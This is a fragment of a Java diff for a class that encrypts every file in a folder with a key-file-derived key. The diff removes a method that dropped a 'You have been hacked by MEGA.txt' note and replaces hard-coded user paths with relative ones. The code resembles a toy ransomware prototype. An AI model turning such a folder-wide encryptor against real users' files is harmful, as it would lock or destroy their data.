@@ -9,18 +9,16 @@ import java.util.Arrays;
 public class vvv1 {
 
     public static void main(String[] args) {
-        String folderPath = "C:\\Code\\JAVA\\vvv1\\src\\files";
-        String keyFilePath = "C:\\Users\\Mega\\Desktop\\thekey.key";
+        Path folderPath = Paths.get("src", "files");
+        Path keyFilePath = Paths.get("thekey.key");
 
-        String key = makeKey(keyFilePath, 32);
-        makeHaha(folderPath);
+        String key = makeKey(keyFilePath.toString(), 32);
 
-        File folder = new File(folderPath);
+        File folder = folderPath.toFile();
         File[] listOfFiles = folder.listFiles();
 
         for (File file : listOfFiles) {
-            if (file.isFile() && !file.getName().equals("thekey.key") && !file.getName().endsWith(".enc")
-                    && !file.getName().equals("You have been hacked by MEGA.txt")) {
+            if (file.isFile() && !file.getName().equals("thekey.key") && !file.getName().endsWith(".enc")) {
                 try {
                     byte[] fileData = Files.readAllBytes(file.toPath());
                     byte[] encryptedData = encrypt(fileData, key);
@@ -54,16 +52,6 @@ public class vvv1 {
         }
 
         return key.toString();
-    }
-
-    public static void makeHaha(String folderPath) {
-        File hahaFile = new File(folderPath + "\\You have been hacked by MEGA.txt");
-        try (FileWriter writer = new FileWriter(hahaFile)) {
-            writer.write("lol");
-            System.out.println("haha done");
-        } catch (IOException e) {
-            System.out.println("Failed to create test file");
-        }
     }
 
     public static SecretKeySpec getAESKeyFromString(String myKey) throws Exception {
